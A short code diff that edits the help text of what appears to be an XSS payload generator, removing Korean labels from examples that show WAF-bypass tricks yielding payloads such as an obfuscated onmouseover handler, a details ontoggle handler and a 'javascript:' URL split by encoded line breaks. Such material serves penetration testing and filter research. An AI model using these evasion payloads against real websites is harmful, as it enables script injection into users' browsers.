@@ -267,10 +267,10 @@ def print_help():
    - WAF parsing bypass: {"tag": "a", "tricks": ["space_jumble", "slash_sep"], "payload": "alert(1)"}
      => <a%0aonmouseover/="alert(1)">
 
-   - 로직 변조: {"tag": "details", "tricks": ["var_assign"], "payload": "confirm(1)"}
+   - {"tag": "details", "tricks": ["var_assign"], "payload": "confirm(1)"}
      => <details ontoggle="x=confirm,x(1)">
 
-   - 프로토콜 변조: {"tag": "a", "tricks": ["proto_var", "case"], "payload": "alert(1)"}
+   - {"tag": "a", "tricks": ["proto_var", "case"], "payload": "alert(1)"}
      => <a href="java&#13;&#10;script:AlErT(1)">
 
    - Import Maps: {"tricks": ["import_map"], "payload": "alert(1)"}
